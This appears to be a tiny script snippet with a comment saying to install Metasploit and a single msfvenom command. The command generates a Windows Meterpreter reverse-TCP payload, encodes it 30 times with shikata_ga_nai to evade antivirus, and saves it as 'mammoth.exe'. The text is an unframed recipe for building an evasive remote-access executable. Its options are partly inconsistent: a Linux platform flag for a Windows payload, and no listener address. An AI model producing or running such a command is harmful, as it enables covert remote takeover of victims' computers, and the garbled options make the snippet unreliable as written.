#make sure you have metasploit framewok installed in your system
sudo msfvenom -p payload/windows/meterpreter/reverse_tcp -i 30 -e  x86/shikata_ga_nai --platform=linux -f exe -b \x00 -o mammoth.exe
